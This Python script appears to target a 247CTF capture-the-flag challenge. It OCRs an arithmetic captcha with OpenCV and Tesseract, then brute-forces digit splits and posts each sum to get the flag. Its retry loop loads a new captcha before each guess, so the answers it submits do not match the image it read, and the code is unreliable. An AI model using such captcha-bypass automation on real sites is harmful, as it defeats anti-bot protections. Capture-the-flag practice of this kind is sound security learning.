#!/usr/bin/env python3
import cv2
import numpy as np
import pytesseract
import requests
import re

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

def solve_aggressive(session):
    html_response = session.get(BASE_URL)
    img_response = session.get(BASE_URL + "mturk.php")
    nparr = np.frombuffer(img_response.content, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
    
    # OCR
    _, thresh = cv2.threshold(img, 127, 255, cv2.THRESH_BINARY_INV)
    mega = cv2.resize(thresh, (img.shape[1]*10, img.shape[0]*10), interpolation=cv2.INTER_CUBIC)
    text = pytesseract.image_to_string(mega).strip()
    
    # Extraer TODOS los dígitos
    all_digits = ''.join(re.findall(r'\d', text))
    
    return all_digits, text

# Test
session = requests.Session()

print("Test con parseo agresivo:\n")

for i in range(3):
    digits, raw = solve_aggressive(session)
    
    print(f"{i+1}. Raw OCR: '{raw[:80]}'")
    print(f"   Dígitos: '{digits}'")
    print(f"   Longitud: {len(digits)}")
    
    if len(digits) >= 3:
        # Probar diferentes divisiones
        for split in range(1, min(len(digits), 10)):
            a_str = digits[:split]
            b_str = digits[split:]
            
            if a_str and b_str:
                a = int(a_str)
                b = int(b_str)
                result = a + b
                
                # Probar
                session2 = requests.Session()
                session2.get(BASE_URL)
                session2.get(BASE_URL + "mturk.php")
                
                data = {"captcha": str(result)}
                response = session2.post(BASE_URL, data=data)
                
                if "invalid" not in response.text.lower():
                    print(f"   ✓✓✓ CORRECTO con split={split}: {a} + {b} = {result}")
                    if "flag" in response.text.lower():
                        flag_match = re.search(r'247CTF\{[^}]+\}', response.text, re.IGNORECASE)
                        if flag_match:
                            print(f"\n{flag_match.group(0)}")
                    break
    print()
